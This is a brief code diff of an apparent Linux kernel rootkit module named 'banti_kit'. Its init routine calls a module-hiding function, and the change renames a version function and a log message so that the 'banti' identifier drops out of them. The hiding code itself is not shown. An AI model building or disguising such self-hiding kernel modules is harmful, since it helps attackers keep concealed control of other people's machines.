@@ -42,7 +42,7 @@ static struct list_head *module_kobj_prev;
 /*---------------------------------------------
 | Get banti version
 ---------------------------------------------*/
-const char* banti_get_version(void)
+const char* get_version(void)
 {
     static char str[128];
     sprintf(str, "%s Build %d", DRIVER_VERSION, DRIVER_BUILD);
@@ -135,7 +135,7 @@ static int __init banti_kit_init(void)
     banti_module_hide();
 
     /* Debug log */
-    printk(KERN_INFO "Loaded Banti Module: Version %s\n", banti_get_version());
+    printk(KERN_INFO "Loaded Banti: Version %s\n", get_version());
 
     return 0;
 }
